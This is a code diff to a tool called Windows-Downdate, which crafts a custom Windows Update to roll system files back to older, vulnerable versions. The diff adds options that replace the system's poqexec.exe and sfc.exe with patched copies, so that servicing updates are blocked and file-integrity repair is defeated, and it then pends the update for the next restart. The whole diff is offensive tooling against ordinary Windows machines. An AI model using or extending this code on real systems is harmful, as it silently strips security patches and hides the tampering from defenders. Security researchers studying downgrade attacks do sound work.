@@ -1,5 +1,6 @@
 import argparse
 import logging
+import os
 import sys
 from typing import List
 
@@ -22,9 +23,7 @@ DOWNGRADE_XML_PATH = "resources\\Downgrade.xml"
 
 def parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(description="Windows-Downdate: Craft any customized Windows Update")
-    group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument("--config-xml", type=str, help="Path to the Config.xml file.")
-    group.add_argument("--custom-pending-xml", type=str, help="Path to the custom, finalized Pending.xml file.")
+    parser.add_argument("--config-xml", type=str, required=True, help="Path to the Config.xml file.")
     parser.add_argument("--force-restart", action="store_true", required="--restart-timeout" in sys.argv,
                         help="Flag specifying whether to force an automatic machine restart. "
                              "Update takes place during the restart.")
@@ -83,6 +82,15 @@ def parse_config_xml(config_file_path: str) -> List[UpdateFile]:
     return update_files
 
 
+def create_non_sxs_update_file(source: str, destination: str) -> UpdateFile:
+    source_path_obj = Path(source)
+    if not is_path_exists(source_path_obj.full_path):
+        raise FileNotFoundError(f"Source non-sxs update file {source_path_obj.name} does not exist")
+
+    destination_path_obj = Path(destination)
+    return UpdateFile(source_path_obj, destination_path_obj, False, False)
+
+
 def craft_downgrade_xml(update_files: List[UpdateFile]) -> ET.ElementTree:
     downgrade_xml = get_empty_pending_xml()
     poq_element = find_child_elements_by_match(downgrade_xml, "./POQ")[0]  # Post reboot POQ is always at index 0
@@ -102,41 +110,41 @@ def craft_downgrade_xml(update_files: List[UpdateFile]) -> ET.ElementTree:
 
 
 def main() -> None:
+    cwd = os.getcwd()
     init_logger()
     args = parse_args()
-
-    if args.config_xml:
-        if not is_path_exists(args.config_xml):
-            raise Exception("Config.xml file does not exist")
-
-        downgrade_xml_path = DOWNGRADE_XML_PATH
-        update_files = parse_config_xml(args.config_xml)
-        retrieve_oldest_files_for_update_files(update_files)
-        downgrade_xml = craft_downgrade_xml(update_files)
-        downgrade_xml.write(downgrade_xml_path)
-
-    else:
-        if not is_path_exists(args.custom_pending_xml):
-            raise Exception("Custom Pending.xml file does not exist")
-
-        downgrade_xml_path = args.custom_pending_xml
-
-    # Install all missing Windows Updates to make the system "Up to date"
-    if args.invisible:
-        raise NotImplementedError("Not implemented yet")
-
-    # Add poqexec.exe patch to downgrade XML
-    if args.persistent:
-        raise NotImplementedError("Not implemented yet")
-
-    # Add SFC.exe patch to downgrade XML
-    if args.irreversible:
-        raise NotImplementedError("Not implemented yet")
 
     # Elevate to TrustedInstaller
     if args.elevate:
         raise NotImplementedError("Not implemented yet")
 
+    # Install all missing Windows Updates to make the system "Up to date"
+    if args.invisible:
+        raise NotImplementedError("Not implemented yet")
+
+    if not is_path_exists(args.config_xml):
+        raise Exception("Config.xml file does not exist")
+
+    update_files = parse_config_xml(args.config_xml)
+
+    # Add poqexec.exe patch to downgrade XML and block servicing stack updates
+    if args.persistent:
+        patched_poqexec_path = f"{cwd}\\resources\\PoqExec\\poqexec.exe"
+        poqexec_path = "C:\\Windows\\System32\\poqexec.exe"
+        poqexec_update_file_obj = create_non_sxs_update_file(patched_poqexec_path, poqexec_path)
+        update_files.append(poqexec_update_file_obj)
+
+    # Add SFC.exe patch to downgrade XML
+    if args.irreversible:
+        patched_sfc_path = f"{cwd}\\resources\\SFC\\sfc.exe"
+        sfc_path = "C:\\Windows\\System32\\sfc.exe"
+        sfc_update_file_obj = create_non_sxs_update_file(patched_sfc_path, sfc_path)
+        update_files.append(sfc_update_file_obj)
+
+    retrieve_oldest_files_for_update_files(update_files)
+    downgrade_xml = craft_downgrade_xml(update_files)
+    downgrade_xml_path = f"{cwd}\\{DOWNGRADE_XML_PATH}"
+    downgrade_xml.write(downgrade_xml_path)
     pend_update(downgrade_xml_path)
 
     if args.force_restart:
